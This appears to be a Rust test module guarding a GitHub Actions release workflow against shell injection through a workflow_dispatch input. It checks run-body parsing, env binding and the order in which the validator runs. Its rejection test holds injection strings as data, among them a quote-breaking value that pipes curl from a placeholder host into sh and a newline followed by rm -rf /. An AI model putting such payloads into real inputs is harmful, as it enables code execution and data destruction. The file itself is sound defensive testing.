//! Tests for the rule that keeps a `workflow_dispatch` input out of
//! `.github/workflows/release.yml`'s shell: no `${{ }}` inside a `run:` body,
//! and free-form inputs judged in a step of their own before anything uses
//! them.
//!
//! `${{ }}` is substituted while a step's script is being *generated*, so an
//! interpolated value is part of the script rather than data the script reads.
//! `Calculate new version` used to paste `custom_version` in and then validate
//! the result two lines below; a value carrying a quote and a newline put its
//! second line outside the `if` and made that check unreachable. The value now
//! arrives as an environment binding and is judged by
//! `.github/scripts/validate-custom-version.sh` in a step that runs first.
//!
//! **Scope: `release.yml` only.** Everything asserted here is asserted about
//! that one file. `.github/workflows/release-deploy.yml` — the workflow that
//! actually runs `cargo publish`, with `CARGO_REGISTRY_TOKEN` set at workflow
//! level for every job — has the same defect in five `run:` blocks, including
//! free-form `version` and `tag` inputs that nothing validates anywhere. That
//! is deliberately out of scope here: sweeping it, writing its validator and
//! testing it is its own change — release-deploy.yml (tracked separately),
//! whose issue number was not yet visible when this was written. So the
//! absence of a failure from this module is not a statement that the
//! repository is clean; it is a statement about `release.yml`. Do not read the
//! module name as wider than this paragraph.
//!
//! They live in the lib rather than `tests/`, for the reason stated at
//! `src/elements.rs`'s `triage_coverage`: `cargo test --lib` is the command
//! that works in a constrained environment. The parser asserts it matched
//! something before anything else is trusted, and there is a fixture it is run
//! against, for the same reason `release_version_guard` does — a parser that
//! silently found nothing reports success.

use std::path::PathBuf;
use std::process::Command;

const RELEASE_YML: &str = include_str!("../.github/workflows/release.yml");

/// The validator the workflow calls. Named once so a rename fails in one place.
const SCRIPT: &str = ".github/scripts/validate-custom-version.sh";

/// The number of `run:` bodies `release.yml` had when this was written. A floor
/// rather than an equality: steps get added. It exists so that a parser which
/// stopped recognising anything cannot pass the "no interpolation" test by
/// finding nothing to check.
const RUN_BODY_FLOOR: usize = 10;

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
}

/// One `run:` body, with the 1-based line its `run:` key sits on.
#[derive(Debug)]
struct RunBody {
    line: usize,
    text: String,
}

fn indent_of(line: &str) -> usize {
    line.len() - line.trim_start().len()
}

/// Every `run:` body in a workflow, and nothing else.
///
/// Handles both shapes this repository uses: `run: <command>` on one line, and
/// a `run: |` block scalar whose body is every following line indented past the
/// `run:` key. Deliberately narrow — `env:` bindings, `with:` values, job
/// outputs and the file's own comments all contain `${{` legitimately, and only
/// a `run:` body is a shell script.
fn run_bodies(yaml: &str) -> Vec<RunBody> {
    let lines: Vec<&str> = yaml.lines().collect();
    let mut bodies = Vec::new();
    let mut i = 0;

    while i < lines.len() {
        let line = lines[i];
        let trimmed = line.trim_start();
        let Some(rest) = trimmed.strip_prefix("run:") else {
            i += 1;
            continue;
        };
        let key_indent = indent_of(line);
        let rest = rest.trim();

        // A block scalar: `|`, `|-`, `>`, and their chomping variants.
        if rest.starts_with('|') || rest.starts_with('>') {
            let mut text = String::new();
            let mut j = i + 1;
            while j < lines.len() {
                let body_line = lines[j];
                if !body_line.trim().is_empty() && indent_of(body_line) <= key_indent {
                    break;
                }
                text.push_str(body_line);
                text.push('\n');
                j += 1;
            }
            bodies.push(RunBody { line: i + 1, text });
            i = j;
        } else {
            bodies.push(RunBody {
                line: i + 1,
                text: rest.to_string(),
            });
            i += 1;
        }
    }

    bodies
}

/// A workflow shaped like the ones here, carrying exactly one interpolated
/// `run:` body, so that the detector is checked against a known answer rather
/// than only against a file that is expected to be clean.
const FIXTURE: &str = r#"# A comment mentioning ${{ inputs.thing }}, which is not a script.
name: Fixture
on:
  workflow_dispatch:
    inputs:
      thing:
        type: string
jobs:
  demo:
    runs-on: ubuntu-latest
    steps:
      - name: Bound properly
        env:
          THING: ${{ inputs.thing }}
        run: |
          echo "$THING"
      - name: Interpolated
        run: |
          echo "${{ inputs.thing }}"
      - name: One-liner
        run: echo clean
      - name: Uses an action
        uses: actions/checkout@v4
        with:
          ref: ${{ inputs.thing }}
"#;

#[test]
fn the_run_body_parser_sees_an_interpolated_body_and_only_that() {
    let bodies = run_bodies(FIXTURE);

    assert_eq!(
        bodies.len(),
        3,
        "the fixture has three `run:` bodies — two blocks and a one-liner — and the \
         parser found {}: {bodies:#?}",
        bodies.len()
    );

    let interpolated: Vec<usize> = bodies
        .iter()
        .filter(|b| b.text.contains("${{"))
        .map(|b| b.line)
        .collect();

    assert_eq!(
        interpolated.len(),
        1,
        "the fixture interpolates into exactly one `run:` body; the parser called it \
         {interpolated:?}. Either it cannot see an interpolated body, or it mistook \
         the comment, the `env:` binding or the `with:` value for one"
    );

    let clean = bodies
        .iter()
        .find(|b| b.text.contains("$THING"))
        .expect("the parser lost the body that reads the env binding");
    assert!(
        !clean.text.contains("${{"),
        "the `env:` binding above a body leaked into the body: {clean:#?}"
    );

    assert!(
        bodies.iter().any(|b| b.text.trim() == "echo clean"),
        "the `run: <command>` one-liner shape was not parsed: {bodies:#?}"
    );
}

/// The rule itself. `${{ }}` inside a `run:` body is substituted before the
/// shell sees it, so the value is code rather than data and nothing written
/// inside that body can judge it in time.
#[test]
fn no_run_body_in_release_yml_interpolates_a_workflow_expression() {
    let bodies = run_bodies(RELEASE_YML);

    assert!(
        bodies.len() >= RUN_BODY_FLOOR,
        "the parser found only {} `run:` bodies in release.yml, below the floor of \
         {RUN_BODY_FLOOR}. Either most steps were deleted or the parser stopped \
         working — and a parser that finds nothing passes the check below for free",
        bodies.len()
    );

    let offenders: Vec<String> = bodies
        .iter()
        .filter(|b| b.text.contains("${{"))
        .map(|b| format!("line {}:\n{}", b.line, b.text))
        .collect();

    assert!(
        offenders.is_empty(),
        "release.yml interpolates a workflow expression into a `run:` body. Bind the \
         value under `env:` and read it as \"$NAME\" instead — see the rule at the top \
         of the file:\n\n{}",
        offenders.join("\n")
    );
}

/// The input this was reported about, specifically: it may appear as the
/// right-hand side of an `env:` binding and nowhere else.
#[test]
fn custom_version_reaches_the_shell_only_as_an_env_binding() {
    let mentions: Vec<(usize, &str)> = RELEASE_YML
        .lines()
        .enumerate()
        .filter(|(_, line)| line.contains("inputs.custom_version"))
        .map(|(i, line)| (i + 1, line.trim()))
        .collect();

    assert!(
        !mentions.is_empty(),
        "release.yml no longer reads the custom_version input at all, so this test is \
         checking nothing"
    );

    for (line, text) in &mentions {
        let bound = text.split_once(": ").is_some_and(|(name, value)| {
            !name.is_empty()
                && name.chars().all(|c| c.is_ascii_uppercase() || c == '_')
                && value.trim() == "${{ inputs.custom_version }}"
        });
        assert!(
            bound,
            "line {line} uses the custom_version input somewhere other than an `env:` \
             binding: {text}"
        );
    }
}

/// A validator that runs after the value has been used is not a validator. It
/// has to precede the step that computes the version from it, and every step
/// that writes something.
#[test]
fn the_validator_runs_before_anything_uses_the_version() {
    let validator = RELEASE_YML
        .find(SCRIPT)
        .unwrap_or_else(|| panic!("release.yml no longer calls {SCRIPT}"));

    for user in [
        "- name: Calculate new version",
        "cargo set-version",
        "git tag -a",
        "git push origin",
    ] {
        let at = RELEASE_YML.find(user).unwrap_or_else(|| {
            panic!(
                "release.yml no longer contains `{user}`. If the step was renamed, \
                 update this list — otherwise this test passes by finding nothing"
            )
        });
        assert!(
            validator < at,
            "`{user}` comes before the custom_version validator, so the value is used \
             before it is judged"
        );
    }
}

/// The step exists, still binds the input, still hands it to the script, and is
/// not skipped. The empty value is what every `version_type` dispatch sends and
/// the script accepts it, so there is nothing for an `if:` to save.
#[test]
fn the_validation_step_binds_the_input_and_passes_it_on() {
    let start = RELEASE_YML
        .find("      - name: Validate custom_version")
        .expect("the validation step was renamed; update this test with it");
    let rest = &RELEASE_YML[start + 1..];
    let end = rest
        .find("\n      - name: ")
        .expect("the validation step is never closed by another step");
    let step = &rest[..end];

    assert!(
        step.contains("CUSTOM_VERSION: ${{ inputs.custom_version }}"),
        "the validation step no longer binds the input, so it is judging something \
         else:\n{step}"
    );
    assert!(
        step.contains(SCRIPT) && step.contains("\"$CUSTOM_VERSION\""),
        "the validation step no longer passes the bound value to {SCRIPT}:\n{step}"
    );
    assert!(
        !step.contains("if:"),
        "the validation step grew an `if:`, so some dispatch reaches the shell \
         unjudged:\n{step}"
    );
}

fn run_validator(argv: &[&str]) -> std::process::Output {
    Command::new("bash")
        .arg(repo_root().join(SCRIPT))
        .args(argv)
        .output()
        .expect("bash is available to run the validator")
}

#[test]
fn the_workflow_calls_a_validator_that_exists() {
    assert!(
        repo_root().join(SCRIPT).exists(),
        "{SCRIPT} is gone, and release.yml calls it"
    );
    assert!(
        RELEASE_YML.contains(SCRIPT),
        "release.yml no longer calls {SCRIPT}, so nothing judges custom_version before \
         the shell sees it"
    );
}

/// The empty value is in this list on purpose: it is what a `version_type`
/// dispatch sends, and a validator that rejected it would break the ordinary
/// release path.
#[test]
fn the_validator_accepts_a_version_and_the_empty_value() {
    for version in ["1.2.3", "0.8.0", "1.2.3-beta.1", "10.20.30-rc.2", ""] {
        let out = run_validator(&[version]);
        assert!(
            out.status.success(),
            "the validator rejected `{version}`, which is a value a real dispatch \
             sends:\n{}",
            String::from_utf8_lossy(&out.stderr)
        );
    }
}

/// The two-line cases are the reason the check is bash `[[ =~ ]]` rather than
/// the `echo | grep -qE '^…$'` it replaces: `grep` judges one line at a time,
/// so a value whose first line is a version passed however it continued.
#[test]
fn the_validator_rejects_everything_that_is_not_a_version() {
    for version in [
        "v1.2.3",
        "1.2",
        "1.2.3.4",
        " 1.2.3",
        "1.2.3 ",
        "latest",
        "1.2.3; id",
        "$(id)",
        "`id`",
        "1.2.3\"; curl http://example.invalid/x | sh; \"",
        "1.2.3\nrm -rf /",
    ] {
        let out = run_validator(&[version]);
        assert_eq!(
            out.status.code(),
            Some(1),
            "the validator answered {:?} for {version:?}; 1 is `not a version`",
            out.status.code()
        );
    }
}

/// A wiring mistake and a mistyped version are different problems with
/// different fixes, so they get different codes. Kept distinct deliberately.
#[test]
fn the_validator_reports_a_usage_error_separately() {
    let out = run_validator(&[]);
    assert_eq!(
        out.status.code(),
        Some(2),
        "called with no argument the validator answered {:?}; 2 is `wired up wrong`, \
         and must stay distinct from 1, `not a version`",
        out.status.code()
    );
}
